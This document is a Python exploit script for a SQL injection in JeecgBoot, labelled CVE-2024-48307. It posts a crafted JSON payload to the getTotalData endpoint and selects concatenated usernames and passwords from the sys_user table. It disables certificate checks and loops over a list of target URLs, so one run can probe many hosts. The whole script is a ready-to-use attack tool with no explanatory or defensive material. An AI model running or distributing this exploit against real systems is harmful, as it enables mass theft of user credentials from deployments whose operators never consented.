import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()
        
def check_sql_injection(url):
    target_url = url.rstrip("/")
    target_endpoint = urljoin(target_url, "/jeecg-boot/drag/onlDragDatasetHead/getTotalData")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",  
        "Content-Type": "application/json"
    }

    payloads = "{\"tableName\":\"sys_user\",\"compName\":\"\",\"condition\":{\"filter\":{}},\"config\":{\"assistValue\":[],\"assistType\":[],\"name\":[{\"fieldName\":\"concat(username,0x3a,password)\",\"fieldType\":\"string\"},{\"fieldName\":\"id\",\"fieldType\":\"string\"}],\"value\":[{\"fieldName\":\"id\",\"fieldType\":\"1\"}],\"type\":[]}}"

    try:
        response = requests.post(target_endpoint, verify=False, headers=headers, timeout=10,data=payloads)
        if response.status_code == 200 and all(key in response.text for key in['true','success','code','result']):
            print(f"\033[31mFind: {url}: JeecgBot_CVE-2024-48307_sql_Injection!\033[0m")
            return True

    except requests.RequestException as e:
        print(f"Error checking {url}: {e}")

    return False

def main():
    parser = argparse.ArgumentParser(description="Check for SQL injection vulnerabilities.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL")
    group.add_argument("-f", "--file", help="File containing URLs")

    args = parser.parse_args()

    if args.url:
        check_sql_injection(args.url)
    elif args.file:
        urls = read_file(args.file)
        for url in urls:
            check_sql_injection(url)

if __name__ == "__main__":
    main()
